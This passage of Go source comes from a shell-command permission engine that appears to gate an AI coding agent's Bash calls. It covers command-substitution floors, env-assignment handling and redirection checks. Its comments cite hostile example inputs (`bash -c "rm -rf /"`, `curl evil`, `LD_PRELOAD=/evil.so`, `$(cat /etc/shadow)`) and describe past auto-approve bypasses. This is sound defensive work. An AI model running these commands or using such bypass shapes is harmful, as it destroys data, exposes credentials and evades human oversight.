	downstream := cmdparse.DownstreamStages(leaves, pc.Raw)
	if len(downstream) != 1 {
		return false
	}
	return pipeRelaySinkCleared(downstream[0])
}

// evaluateHeredocBodies and evaluateSubstitutionsIn — the two ENGINE TEXT HOPS
// ADR 0039's LOWERING.md named as this bead's (pg2-1019a) remaining shims — are
// DELETED. Each took a body/leaf STRING and handed it to a cmdparse scan
// (ScanSubstitutionsInHeredocBody / ScanSubstitutions) that re-parsed text this
// same expression's own ParseShell call had already parsed. Their callers now
// read pc.UnquotedHeredocSubstitutions() / pc.Substitutions directly — PLAIN
// DATA pre-lowered during that one parse (ADR 0039 step 4, I7/I12) — and feed
// them straight to foldSubstitutionScan below, which no longer takes a scan to
// fold, only a []cmdparse.Substitution.
//
// cmdparse.ScanSubstitutions and cmdparse.ScanSubstitutionsInHeredocBody
// THEMSELVES are NOT deleted: unlike these two engine hops, they still have
// live callers with no corresponding pre-parsed subtree to walk —
// rules/ssh's carriesSubstitution scans a REMOTE host's command text, which
// is data inside a local quoted argument and was never parsed as CETA's own
// AST; cmdparse.HasUnsafeCommandSubstitution (no production caller, kept
// correct for the fuzz harness per its own doc) uses ScanSubstitutions too.
// Both are I7's permanent text entry point, not this bead's concern.

// unparseableSubstitutionFloor — the verdict a DESYNCED substitution scan used
// to contribute (pg2-wguam, P0 SECURITY: an empty/short body list from a scan
// that lost track of the text is absence of evidence, not evidence of
// absence) — is DELETED along with its only caller.
//
// Its call site was foldSubstitutionScan's `if scan.Unparseable` branch, fed
// by evaluateSubstitutionsIn/evaluateHeredocBodies re-parsing a leaf's Raw or a
// heredoc body as ISOLATED text — a genuinely separate parse of a substring
// that could, in principle, desync from the parse that produced the substring
// in the first place. ADR 0039 step 4 removes that re-parse entirely:
// pc.Substitutions and Heredoc.Substitutions are found by WALKING nodes
// already inside the one successful parse of the whole expression, so there
// is no second parse left to desync — a leaf this engine reached already
// belongs to a `!sp.Unparseable` ShellParse, and every substitution/heredoc
// body nested under it inherits that same guarantee, recursively, all the way
// down (cmdparse.lowerSubtree never calls Parser.Parse/Document). The class of
// input this floor existed to catch — cmdparse stopped modelling text it was
// asked to scan — is therefore structurally impossible on this path now,
// exactly as ADR 0039's LOWERING.md predicted ("Step 4 removes the hop and
// with it the need for that salvage"). The underlying I1a/I1b PRINCIPLE this
// floor implemented is not weakened: it still governs
// cmdparse.SubstitutionScan.Unparseable directly, for its own remaining
// TEXT-based callers (rules/ssh's carriesSubstitution reads it inline).

// commandSubstitutionFloor is the verdict contributed by a COMMAND substitution
// ($()/backtick) body that fails EITHER gate of cmdparse's static
// safe-substitution clearance: the seam REFUSES it outright, or the seam
// CLEARS it but full-engine recursion did not independently approve it.
//
// pg2-whumr (operator ruling pg2-gwp57, "harmonize up", recorded in ADR 0048):
// ADR 0043 states NoOpinion is auto-approved in `auto` mode, so a command
// substitution must be POSITIVELY CLEARED BY BOTH GATES to reach Approve — the
// static allowlist did NOT refuse it, AND full-engine recursion of the body
// approved it — or its contribution can be no LESS restrictive than a decisive
// Ask. Before this floor existed, a REFUSED body only lost its clearance when
// recursion happened to reach the SECOND gate too (i.e. only a recursion
// Approve was demoted, to NoOpinion). An EXHAUSTION body — one owned by no
// rule, e.g. `bash -c "rm -rf /"`, `python3 -c ...`, `sh -c ...`,
// `ssh host rm -rf /`, `npm install evil`, `curl evil` — fails gate one but
// recursion also lands on NoOpinion (loop exhaustion, ADR 0044's
// ProvenanceExhaustion), never Approve, so the old check never fired and the
// body reached NoOpinion end to end: auto-approved in `auto` mode, a live RCE
// hole this floor closes.
//
// The SAME hole recurs for a body the allowlist CLEARS rather than refuses:
// `seq` and `mktemp` are on cmdparse's static list PRECISELY BECAUSE no rule
// approves them standalone (envvars' ExpansionSafeCmd path exploits that by
// skipping recursion entirely for a Cleared body, but command position always
// recurses), so `echo $(seq 1 3)` / `echo $(mktemp)` reached recursion's own
// terminal exhaustion NoOpinion with nothing left to raise it — identical
// auto-approve shape, different gate. ceta models no interpreter (ADR 0044),
// so a rule cannot tell `seq 1 3`'s harmless exhaustion apart from `bash -c`'s
// dangerous one — the ruling this floor implements explicitly forbids trying,
// and instead raises the floor for the WHOLE exhaustion class uniformly,
// whichever gate it slips through, in COMMAND position only. A Cleared body a
// rule DOES independently approve (`date`, `hostname`, and — since pg2-u65fu —
// a quoted-heredoc-into-`cat` body, which safe-commands approves as a bare
// argument-less read once heredocFloor stops masking that verdict for exactly
// this recursed-and-cleared case) never reaches this floor at all, and neither
// does a Cleared body some OTHER mechanism already examined and declined for
// its own recorded reason (a substitution-cycle guard's own NoOpinion) — see
// the call site's own ProvenanceExhaustion gate for the case split.
//
// Env-value position is UNCHANGED: it clears on EITHER gate
// (internal/rules/envvars.go's positively-cleared predicate), so this floor
// converges the two positions upward rather than widening either one downward.
//
// Delegated bodies never reach this floor — see the call site's own
// "DELEGATED NEVER FLOORS HERE" comment for why such a body must stay governed
// by recursion alone, in both directions. Folded through hookio.MostRestrictive
// like heredocFloor above, so this stays order-independent: it can only ever
// raise a verdict, never mask a Reject a sibling substitution or the leaf's
// own rules already earned.
func commandSubstitutionFloor(body string) hookio.RuleResult {
	return hookio.RuleResult{
		Decision: hookio.Ask,
		Reason:   "command substitution not positively cleared by both gates (static allowlist and full-engine recursion): " + body,
		Module:   "engine",
	}
}

// foldSubstitutionScan folds a leaf's OR a heredoc body's OWN top-level
// substitutions into a single verdict: every one recursed through ALL rules
// and held to the static-allowlist floor. Shared by command-position
// substitutions (ParsedCommand.Substitutions) and expandable heredoc bodies
// (ParsedCommand.UnquotedHeredocSubstitutions) so the identical recursion
// applies to both — they differ only in WHICH pre-lowered slice the caller
// passes, not in how each entry is folded.
//
// subs is ALREADY KNOWN, pre-lowered data (ADR 0039 step 4, I7/I12): it was
// found by walking nodes inside the one successful parse that produced the
// caller's leaf, so — unlike the deleted evaluateSubstitutionsIn /
// evaluateHeredocBodies text hops this function used to be fed by — there is
// no "the scan desynced" case left to floor here. See the deleted
// unparseableSubstitutionFloor's own comment (just above commandSubstitutionFloor)
// for why that is structurally true rather than merely unobserved.
//
// outerVars/outerTempDirVars (tc-5h6e) are the caller's OWN inCommandVars/
// inCommandTempDirVars — the fully-overlaid environment visible to the leaf that
// CONTAINS subs, computed by evaluateParsed's loop just before any of this
// function's four call sites. Forwarded unchanged into the recursive evaluateParsed
// call below as ITS outerVars/outerTempDirVars: a command-substitution or
// arithmetic-expansion body executes in the SAME shell as its enclosing leaf, so
// every name that leaf can see, sub.Body can see too — an assignment from a SIBLING
// leaf earlier in the OUTER expression (`SP=/x; echo "$(cat $SP/f)"`) is exactly as
// visible inside the substitution as it is to a plain argument of the same leaf
// (`sed -n 1p "$SP/f"`), because bash draws no such distinction: nothing about being
// inside `$(...)` creates a new variable scope. Before this bead the recursive call
// passed no outer scope at all, so cmdparse.InCommandVars(sub.Leaves, i) inside the
// recursion only ever saw sub.Body's OWN internal assignments — losing every binding
// established outside the substitution, at ANY nesting depth, since each recursive
// evaluateParsed call started the overlay chain over from nil.
func (e *Engine) foldSubstitutionScan(subs []cmdparse.Substitution, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput, outerVars, outerTempDirVars map[string]string) hookio.RuleResult {
	result := hookio.RuleResult{Decision: hookio.Approve, Reason: "no substitutions to evaluate", Module: "engine"}
	for _, sub := range subs {
		// subNormalized, not the outer `normalized`: the cycle-detection KEY MUST
		// be this substitution's OWN body text (I12 — an exact source slice,
		// normalised), so a body that repeats an ANCESTOR's command is caught
		// however deep the nesting. The pushed stack frame still carries the
		// OUTER `normalized` (unchanged from before this bead): that is what
		// lets a substitution nested inside sub.Body, several levels down, be
		// recognised as repeating THIS level's own enclosing command — see
		// recursedSubstitutionHeredocCleared's doc for the mechanism that reads
		// the frame back.
		subNormalized := normalizeExpression(sub.Body)
		var subResult hookio.RuleResult
		if cyc, hit := detectCycle(subNormalized, stack); hit {
			subResult = cyc
		} else {
			subStack := append(stack, hookio.StackFrame{RuleName: "engine", Command: "substitution", Expression: normalized})
			// evaluateParsed, not EvaluateExpression: sub.Leaves is ALREADY the
			// pre-lowered leaf set for sub.Body (recursively, all the way down —
			// cmdparse.lowerSubtree populated its own Substitutions/Heredocs the
			// same way), so calling the text entry point here would re-parse a
			// body this expression's own ParseShell call already parsed — the
			// exact re-parse ADR 0039 step 4 removes.
			subResult = e.evaluateParsed(sub.Body, cmdparse.ShellParse{Leaves: sub.Leaves}, subNormalized, subStack, origin, outerVars, outerTempDirVars)
		}

		// Static allowlist FLOOR for command substitutions ($()/backtick): BOTH
		// GATES must positively clear a body before its contribution can be
		// Approve — the seam did not REFUSE it, AND recursion independently
		// approves it — or the contribution is no LESS restrictive than a
		// decisive Ask (pg2-whumr, operator ruling pg2-gwp57, ADR 0048). See
		// commandSubstitutionFloor's own doc comment for the full rationale.
		// Process substitutions have no static allowlist and are governed by
		// recursion alone.
		//
		// REFUSED (e.g. `git show HEAD` — textconv/external-diff RCE, or an
		// EXHAUSTION body no rule models at all, e.g. `bash -c "rm -rf /"`) floors
		// UNCONDITIONALLY: recursion approving it must never leak an Approve
		// through (that would unlock the very RCE surface the refusal exists to
		// stop), and recursion NOT approving it must not remain a silent NoOpinion
		// either — both directions land on at least Ask.
		//
		// CLEARED floors ONLY WHEN RECURSION DID NOT ALSO APPROVE. Several
		// entries on cmdparse's static allowlist (`seq`, `mktemp`, and any other
		// body no rule models standalone) are on the list PRECISELY BECAUSE no
		// rule approves them independently — envvars' ExpansionSafeCmd path
		// exploits that by skipping recursion entirely, but command position
		// always recurses, so a Cleared-but-unmodeled body reached recursion's
		// own terminal loop-EXHAUSTION NoOpinion with nothing left to raise it.
		// That is the identical auto-approved-in-`auto`-mode hole this bead
		// closes for Refused bodies, wearing a different clearance: `echo
		// $(seq 1 3)` and `echo $(mktemp)` must become Ask, not stay Abstain
		// (per the ruling, clearing an exhaustion anywhere is forbidden
		// regardless of which list vouches for it) — while `echo
		// $(date)`/`echo $(hostname)`, whose bare forms a rule DOES approve,
		// are untouched because recursion already carries the Approve.
		//
		// GATED ON ProvenanceExhaustion SPECIFICALLY (ADR 0044), not on any
		// NoOpinion: a Cleared body can also land on NoOpinion because some
		// OTHER floor already examined and declined it — e.g. the
		// substitution-cycle guard's own NoOpinion (ProvenanceRefusal, not
		// Exhaustion) when a Cleared body happens to repeat an expression
		// already on the evaluation stack. Those are considered refusals with
		// their own recorded reason, not "nobody modelled this" — flooring
		// them here would reach past this bead's authorized scope and
		// duplicate a decision that belongs to whichever mechanism made it.
		//
		// A quoted heredoc admitted onto cmdparse's static list (pg2-phtl3) USED
		// to be exactly this shape too — recursing through heredocFloor()'s own
		// then-unconditional NoOpinion regardless of the Cleared verdict — but
		// that was a gap, not a design choice, and pg2-u65fu closed it:
		// heredocFloor() now steps aside for precisely this recursion boundary
		// (a leaf that is itself the WHOLE of the recursed body, and Cleared for
		// exactly this reason), so the leaf's own chain verdict reaches this
		// switch instead of being pre-floored to NoOpinion. See heredocFloor's
		// own doc for the full narrowing and why it cannot reach the top-level
		// heredoc case or any body cmdparse does not clear.
		//
		// DELEGATED NEVER FLOORS HERE (pg2-zpct4). A modelled read's only open
		// question is whether `patheval` allows its PATH, which recursion alone
		// answers, in BOTH directions: `$(cat /tmp/x.json)` keeps its decisive
		// allow because the authoritative model approved the read, and
		// `$(cat /etc/shadow)` stays refused by that SAME model — this floor has
		// no opinion to add either way, and flooring it would punish the seam for
		// correctly declining to hold one.
		if sub.IsCommandSubstitution() {
			switch cmdparse.ClassifySubstitutionBody(sub.Body) {
			case cmdparse.SubstitutionRefused:
				subResult = hookio.MostRestrictive(subResult, commandSubstitutionFloor(sub.Body))
			case cmdparse.SubstitutionCleared:
				if subResult.Decision == hookio.NoOpinion && subResult.Provenance == hookio.ProvenanceExhaustion {
					subResult = hookio.MostRestrictive(subResult, commandSubstitutionFloor(sub.Body))
				}
			}
		}

		// mostRestrictiveAttributed: subResult is a recursive EvaluateExpression
		// verdict, so its Approve can already carry the deciding rule's own
		// attribution rather than the neutral "no substitutions" seed `result` starts
		// at — same pg2-he22o concern as EvaluateExpression's own leaf fold.
		result = mostRestrictiveAttributed(result, subResult)
	}
	return result
}

// evaluateAssignmentOnlyLeaf returns the verdict for the ENV ASSIGNMENTS carried by
// a command-less leaf — an assignment-only segment such as the `LD_PRELOAD=/evil.so`
// of `LD_PRELOAD=/evil.so && echo hi`, or a whole command that is nothing but
// assignments (pg2-mtnmb).
//
// Such a leaf used to be dropped by cmdparse.Parse outright, so its assignments
// reached no rule at all; the fold is Approve iff EVERY surviving leaf approves, so
// the compound folded to the sibling's verdict alone and the hook answered `allow`
// — a live auto-approve bypass of the pg2-gkd5e env-assignment guard, in the
// deployed binary. Parse now retains the leaf, and this runs the rule chain on it so
// the env-var rule (and any other rule with an opinion about the raw text) is
// consulted. Routing through the same synthetic-HookInput + e.Evaluate path the
// executable-bearing leaves use is what makes the compound form reach the SAME
// verdict as the leading / `export` / `env` forms of the same assignment.
//
// judged reports whether a rule actually had an opinion. It is false both when the
// leaf carries no assignments at all and when the chain had no opinion on them — see the
// NEUTRAL discussion below and the caller's judgedLeaf floor.
//
// rootExpr is the whole expression this leaf was split out of, forwarded as
// hookio.HookInput.RootExpression so a rule needing EXPRESSION scope can reach the
// sibling leaves. It matters most for exactly this shape: an assignment-only leaf
// binds a path and accesses nothing, so whether that path is later read or written
// is knowable only from the siblings (pg2-3hk7t).
//
// inCommandVars is the same per-leaf snapshot the executable-bearing path forwards
// (cmdparse.InCommandVars at THIS leaf's index, so the leaf's own assignments are
// excluded). Forwarding it changes no verdict for MOST consumers — a rule that judges a
// PATH an executable named cannot apply to a command-less leaf at all — but envvars IS
// such a consumer for its OWN in-command dataflow (pg2-qhhil, pg2-d71my): a bare
// `HOME=$(mktemp -d)` or `HOME="$T/h"` with no trailing command is itself command-less,
// so its own env-var verdict is decided HERE, through the chainResult below, and it
// needs exactly this snapshot. inCommandTempDirVars is that same forwarding for the
// sibling fresh-temp-dir marker scan (cmdparse.InCommandTempDirVars). The synthetic
// input must otherwise stay field-for-field the same as the executable-bearing one: a
// field present on one path and absent on the other is a difference no test asserts and
// no author expects — which is why rootLeaves (ADR 0039 step 3's ParsedRoot) is threaded
// here too, even though envvars itself never reads RootExpression: gitdir's
// EnvVars-binding branch (`f=…/.git/config`) DOES reach this leaf shape, through the
// SAME rule chain evaluateAssignmentOnlyLeaf runs below.
func (e *Engine) evaluateAssignmentOnlyLeaf(pc cmdparse.ParsedCommand, cwd, rootExpr string, rootLeaves []cmdparse.ParsedCommand, inCommandVars, inCommandTempDirVars map[string]string, origin *hookio.HookInput) (result hookio.RuleResult, judged bool) {
	if len(pc.EnvVars) == 0 {
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "no env assignments to evaluate", Module: "engine"}, false
	}
	// ParsedLeaf/ParsedRoot replace mustBashJSON(pc.Raw) exactly as the
	// executable-bearing leaf's synthetic input above does — see that
	// construction's comment, and parsedLeafFor's own doc, for why each is
	// safe to thread rather than unconditionally re-derive.
	syntheticInput := &hookio.HookInput{
		SessionID:            origin.SessionID,
		CWD:                  cwd,
		ToolName:             "Bash",
		ParsedLeaf:           parsedLeafFor(pc),
		PermissionMode:       origin.PermissionMode,
		HookEventName:        origin.HookEventName,
		PathEval:             origin.PathEval,
		RootExpression:       rootExpr,
		ParsedRoot:           rootLeaves,
		InCommandVars:        inCommandVars,
		InCommandTempDirVars: inCommandTempDirVars,
	}
	// A DECISIVE verdict is judged, and so — since ADR 0044 — is a NoOpinion the chain
	// actually FORMED, which this test could not previously distinguish from the
	// chain simply running out. That collapse was the same defect pg2-d0ja3 names at
	// the recursion boundary, one seam over: `chainResult.Decision != NoOpinion` reads
	// "a rule was decisive", and a rule that examined the assignments and refused to
	// clear them was silently filed under "nobody had an opinion", so its floor was
	// replaced by the NEUTRAL Approve below and discarded.
	//
	// It is load-bearing, not tidiness. envvars now refuses (rather than Asks) an
	// assignment whose value runs a command no rule models, and for the command-less
	// form — `count=$(seq 1 3) && cmd`, which is the shape the measured corpus rows
	// actually use — that refusal arrives HERE. Read as unjudged it would leave the
	// leaf at Approve and the compound would take the sibling's verdict alone, turning
	// today's ask into an ALLOW. Read as judged it contributes the NoOpinion the value's
	// own body earned.
	chainResult := e.Evaluate(syntheticInput)
	if chainResult.Decision != hookio.NoOpinion || chainResult.Provenance == hookio.ProvenanceRefusal {
		return chainResult, true
	}
	// NEUTRAL when no rule has a decisive opinion. An assignment-only leaf EXECUTES
	// NOTHING — it binds shell variables — so with nothing to object to it must
	// contribute nothing to the fold, exactly as evaluateRedirections returns Approve
	// for a leaf with no redirections. Folding the chain's NoOpinion instead would
	// demote every ordinary `count=$(...) && cmd` / `A=1 && cmd` from allow to
	// abstain: a mass over-ask (~2041 corpus rows) with no security gain, since the
	// risk an assignment-only leaf DOES carry is judged above —
	//
	//   - the variable NAME: the env-var rule is decisive for injectors (Reject) and
	//     for PATH/HOME (Ask unless the value is the verified-safe preserve shape);
	//   - the VALUE's command substitutions: the env-var rule recurses each body
	//     through the full chain and applies its own Ask fallback when the body is not
	//     positively cleared (pg2-5huwx);
	//   - redirections and heredocs on the same leaf: handled by the caller.
	//
	// RESOLVED (pg2-813ww, ADR 0039 step 5): a PROCESS substitution in a value
	// (`A=<(evil)`) used to classify as ExpansionNone here too, for the identical
	// reason — cmdparse.classifyExpansion's pre-parse shortcut keyed on `$`/backtick
	// alone, so a proc-sub value never reached the census and no recursion happened,
	// in every form (leading, `export`, `env`, compound). The shortcut now also tests
	// for `<(`/`>(`, so such a value reaches the census, classifies ExpansionUnknown
	// (expansionCensus.kind() floors any process substitution there — it has no
	// static allowlist, unlike a sole command substitution), and this leaf's
	// chainResult above already runs the full rule chain on it via the synthetic
	// input, which is what makes `A=<(evil) cmd` recurse `evil` in every form.
	return hookio.RuleResult{
		Decision: hookio.Approve,
		Reason:   "env assignments only, no rule objects (nothing is executed)",
		Module:   "engine",
	}, false
}

func normalizeExpression(expr string) string {
	return strings.Join(strings.Fields(strings.TrimSpace(expr)), " ")
}

// parsedLeafFor computes a synthetic HookInput's ParsedLeaf value for pc.
//
// GUARD 3 (I7, pg2-x9452, ADR 0039 step 5's final bead). Before this function
// existed, both of this file's synthetic-HookInput constructions
// unconditionally called `cmdparse.Parse(pc.Raw)` — re-parsing, from scratch,
// text that this SAME evaluation already parsed once to produce pc in the
// first place. Guard 3's own corpus/fixture harness
// (internal/setup/guard3_parsecount_test.go) caught this on the SIMPLEST
// possible input ("echo just a plain command" — one leaf, no heredoc, no
// pipeline): every ordinary leaf was being parsed exactly twice per hook
// evaluation, which is I7 violated on nearly every command CETA has ever
// evaluated, not a rare corner case.
//
// The fix preserves the ONE behaviour the original comment names as the
// reason `cmdparse.Parse(pc.Raw)` was called at all rather than simply
// wrapping pc: "the documented heredoc-bleed case where re-parsing Raw can
// yield more than one leaf" (I12: a heredoc-bearing leaf's Raw spans past its
// own heredoc body to wherever the extent ends, e.g. `cat <<EOF | grep x`'s
// `cat` stage Raw includes `| grep x`, so re-parsing it independently
// re-derives BOTH stages as separate leaves — existing rule behaviour some
// caller may depend on). For that shape ONLY, this still re-parses.
//
// For every OTHER leaf — the overwhelming majority, and the ONLY shape a
// single, self-contained, non-heredoc statement's Raw can produce when
// re-parsed alone — pc IS already the exact result a fresh parse of pc.Raw
// would produce for the SAME reason the fuzz harness's Raw-idempotence
// invariant holds at all (ADR 0039 Decision item 4: "the fuzz harness's
// idempotence invariant... becomes meaningful rather than vacuous"): pc.Raw
// is defined as the exact source slice pc was ITSELF lowered from, so
// wrapping pc directly is not an approximation of what a fresh parse would
// yield, it is that computation's result, reused instead of redone. The one
// field a fresh reparse would compute DIFFERENTLY is PipelineID/SubshellScope
// (ParsedCommand's own doc: "IDs are per-Parse-call... MUST NOT be compared"
// across calls) — a standalone reparse would renumber pc.Raw's pipeline/
// subshell position from scratch, which is not pc's TRUE position in the
// original expression, so threading pc directly is the MORE correct value,
// not merely an equally-valid one.
func parsedLeafFor(pc cmdparse.ParsedCommand) []cmdparse.ParsedCommand {
	if pc.HasHeredoc {
		return cmdparse.Parse(pc.Raw)
	}
	return []cmdparse.ParsedCommand{pc}
}

// mustBashJSON and BOTH its call sites are DELETED (ADR 0039 step 3, root
// cause 3). It re-serialised a leaf's already-parsed Raw text into a synthetic
// ToolInput JSON string purely so every rule could unmarshal it back out and
// re-parse it themselves — the engine-to-rule boundary re-serialising
// structure back to text. hookio.HookInput.ParsedLeaf/ParsedRoot now carry the
// already-computed cmdparse.ParsedCommand structure directly; see those
// fields' doc and cmdparse.LeavesOf/RootLeavesOf, the rule-side accessors that
// replace `cmdStr, _ := input.BashCommand(); cmdparse.Parse(cmdStr)`.

func (e *Engine) evaluateRedirections(redirs []hookio.Redirection, override *patheval.PathEvaluator) hookio.RuleResult {
	// No redirections = no opinion (neutral)
	if len(redirs) == 0 {
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "no redirections to evaluate", Module: "engine"}
	}
	pe := e.pathEval
	if override != nil {
		pe = override
	}
	// Redirections present but no path evaluator
	if pe == nil {
		return hookio.RuleResult{Decision: hookio.NoOpinion, Module: "engine"}
	}
	// dynamic holds the first unresolvable target's NoOpinion. It is NOT returned
	// early: the remaining redirections must still be evaluated so a STATIC
	// read-only target later in the same command (`> "$T" > /etc/hosts`) still
	// produces its Reject instead of being masked by this NoOpinion.
	var dynamic *hookio.RuleResult
	for _, r := range redirs {
		// Standard special device files are always-safe redirect targets; skip
		// them before consulting the PathEvaluator, which would otherwise report
		// PathUnknown and wrongly demote/reject the command (pg2-9ctmb).
		if isSafeRedirectTarget(r.Path) {
			continue
		}
		// A dynamically-expanded target is unresolvable here and MUST NOT be
		// path-evaluated: patheval would silently collapse it into the CWD and
		// classify the write read-write (pg2-2u5jf). Applied to the read
		// direction (`<`) too — an unresolvable source is no more knowable than
		// an unresolvable sink — and before the PathEvaluator so no verdict is
		// ever derived from the collapsed path.
		if isDynamicRedirectTarget(r.Path) {
			if dynamic == nil {
				dynamic = &hookio.RuleResult{
					Decision: hookio.NoOpinion,
					Reason:   "redirection: dynamically-expanded target " + r.Path + " (deferred to claude-code)",
					Module:   "engine",
				}
			}
			continue
		}
		access := pe.Evaluate(r.Path)
		// Kind.IsWrite is the fail-closed test: everything that is not the pure
		// read `<` is checked for WRITABILITY, so a redirection kind added later
		// (tc-xs8x added two) lands on the write branch by default rather than
		// silently becoming read-only here.
		if !r.Kind.IsWrite() {
			if !access.CanRead() {
				return hookio.RuleResult{Decision: hookio.NoOpinion, Reason: "redirection: stdin from non-readable path " + r.Path, Module: "engine"}
			}
			continue
		}
		if access == patheval.PathReadOnly {
			// pg2-yoqsr fallout, root-caused from this exact nix-sandbox gate
			// failure (TestIntegration_TempRepoCarveOut_BeadReproductionShapes'
			// reproduction 2). classify()'s "/nix/**" rule exists to protect the
			// immutable /nix/store, but it matches ANY path under /nix/ by prefix
			// — including /nix/var/nix/builds/<id>, a RUNNING nix build's own
			// PRIVATE, WRITABLE scratch directory (on this machine's nix, $TMPDIR
			// and NIX_BUILD_TOP both land there — verified via the build's own
			// t.TempDir() path in the failing check's log). That is the SAME
			// misclassification internal/patheval's escape_zone_ladder_test.go
			// independently discovered and root-caused for a different test
			// (bead pg2-lw19e) — and that investigation deliberately left
			// classify() itself unchanged: t.TempDir()-rooted HOME/XDG fixtures
			// are ALSO nested under $TMPDIR/NIX_BUILD_TOP in this same
			// environment, so narrowing or reordering classify()'s ladder to
			// exempt the build's scratch directory would ALSO relax the
			// more-specific HOME/XDG zone checks that currently run only because
			// "/nix/**" is unconditional — a much larger blast radius than this
			// one redirection-safety check.
			//
			// Scoped here instead, to the ONE decisive check this actually
			// broke: a write whose RESOLVED target ALSO resolves under one of
			// pg2-yoqsr's own already-vetted temporary roots (temproot.Under —
			// realpath of $TMPDIR, /private/var/folders, /private/tmp, or
			// CETA_EXTRA_TEMP_ROOTS) is this session's own disposable scratch
			// space, not the real read-only resource "/nix/**" exists to
			// protect. /nix/store itself can never be a descendant of any of
			// those roots (a nix store path is a fixed, content-addressed
			// location, never inside a build's own ephemeral $TMPDIR), so this
			// relaxation never reaches the store — it only ever fires for a
			// path that is ALSO, independently, inside this process's own temp
			// scratch tree. pe.ResolvePath reuses the SAME cwd-join + symlink
			// resolution Evaluate() already applied to compute `access`, so
			// temproot.Under sees exactly the path that was actually classified.
			//
			// DELIBERATELY NOT "continue" / NOT Approve. Falling through to the
			// `!access.CanWrite()` check below (access is STILL PathReadOnly,
			// so CanWrite() is still false) downgrades this to NoOpinion rather
			// than granting an outright Approve. That distinction is what keeps
			// TestIntegration_HookBypassRegression's "loop terminator redirect
			// ssh keys" case correct: mkGoTest's buildPhase sets HOME="$TMPDIR"
			// for this SAME nix-sandboxed run, so `~/.ssh/authorized_keys` is
			// ALSO, coincidentally, under a temp root there — and a bare
			// `continue` (treating it as fully safe) actively APPROVED that
			// write in the sandbox alone, a real regression a first cut of this
			// fix introduced and this comment now guards against. NoOpinion
			// defers to whatever later rule or Claude Code's own prompt would
			// otherwise decide, exactly matching this SAME command's ambient
			// (non-sandboxed) verdict today, where `~/.ssh` was never under
			// tmpRoot/$TMPDIR at all and reached NoOpinion by the same
			// `!CanWrite()` branch — this change does not touch that outcome.
			if !temproot.Under(pe.ResolvePath(r.Path)) {
				return hookio.RuleResult{Decision: hookio.Reject, Reason: "redirection: write to read-only path " + r.Path, Module: "engine"}
			}
			// Falls through to the CanWrite() check below rather than
			// continuing past it -- access is still PathReadOnly there, so
			// that check still fires and yields NoOpinion, never Approve,
			// for the relaxed case (see the comment above).
		}
		if !access.CanWrite() {
			return hookio.RuleResult{Decision: hookio.NoOpinion, Reason: "redirection: write to non-writable path " + r.Path, Module: "engine"}
		}
	}
	if dynamic != nil {
		return *dynamic
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "redirections: all paths safe", Module: "engine"}
}
